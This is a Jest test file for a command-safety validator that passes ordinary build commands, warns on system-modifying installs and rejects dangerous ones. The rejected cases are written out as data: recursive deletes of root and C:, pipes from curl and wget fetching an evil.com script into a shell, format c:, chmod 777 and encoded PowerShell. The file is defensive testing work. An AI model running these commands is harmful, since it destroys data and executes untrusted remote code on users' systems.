/**
 * Command Safety Tests
 */

import { validateCommand, validateCommands } from '../checks/command-safety';

describe('validateCommand', () => {
  describe('safe commands', () => {
    it('should accept npm install', () => {
      const result = validateCommand('npm install');
      expect(result.status).toBe('pass');
    });

    it('should accept pnpm run build', () => {
      const result = validateCommand('pnpm run build');
      expect(result.status).toBe('pass');
    });

    it('should accept yarn test', () => {
      const result = validateCommand('yarn test');
      expect(result.status).toBe('pass');
    });

    it('should accept tsc --noEmit', () => {
      const result = validateCommand('tsc --noEmit');
      expect(result.status).toBe('pass');
    });

    it('should accept eslint .', () => {
      const result = validateCommand('eslint .');
      expect(result.status).toBe('pass');
    });

    it('should skip empty command', () => {
      const result = validateCommand('');
      expect(result.status).toBe('pass');
    });
  });

  describe('dangerous commands', () => {
    it('should reject rm -rf /', () => {
      const result = validateCommand('rm -rf /');
      expect(result.status).toBe('fail');
      expect(result.message).toContain('Dangerous');
    });

    it('should reject sudo', () => {
      const result = validateCommand('sudo apt-get install');
      expect(result.status).toBe('fail');
    });

    it('should reject curl | bash', () => {
      const result = validateCommand('curl https://evil.com/script.sh | bash');
      expect(result.status).toBe('fail');
    });

    it('should reject wget | sh', () => {
      const result = validateCommand('wget -O - https://evil.com/script.sh | sh');
      expect(result.status).toBe('fail');
    });

    it('should reject chmod 777', () => {
      const result = validateCommand('chmod 777 /tmp/file');
      expect(result.status).toBe('fail');
    });

    it('should reject format c:', () => {
      const result = validateCommand('format c:');
      expect(result.status).toBe('fail');
    });

    it('should reject rd /s /q', () => {
      const result = validateCommand('rd /s /q C:\\');
      expect(result.status).toBe('fail');
    });

    it('should reject encoded PowerShell', () => {
      const result = validateCommand('powershell -enc SGVsbG8=');
      expect(result.status).toBe('fail');
    });
  });

  describe('system-modifying commands', () => {
    it('should warn about global npm install', () => {
      const result = validateCommand('npm install -g typescript');
      expect(result.status).toBe('warn');
    });

    it('should warn about apt-get', () => {
      const result = validateCommand('apt-get update');
      expect(result.status).toBe('warn');
    });

    it('should warn about pip install', () => {
      const result = validateCommand('pip install package');
      expect(result.status).toBe('warn');
    });
  });
});

describe('validateCommands', () => {
  it('should pass when all commands are safe', () => {
    const result = validateCommands([
      'npm install',
      'npm run build',
      'npm test',
    ]);
    expect(result.status).toBe('pass');
  });

  it('should fail when any command is dangerous', () => {
    const result = validateCommands([
      'npm install',
      'rm -rf /',
      'npm test',
    ]);
    expect(result.status).toBe('fail');
    expect(result.blockers?.length).toBeGreaterThan(0);
  });

  it('should warn when commands are system-modifying', () => {
    const result = validateCommands([
      'npm install',
      'npm install -g typescript',
    ]);
    expect(result.status).toBe('warn');
  });

  it('should pass empty array', () => {
    const result = validateCommands([]);
    expect(result.status).toBe('pass');
  });
});
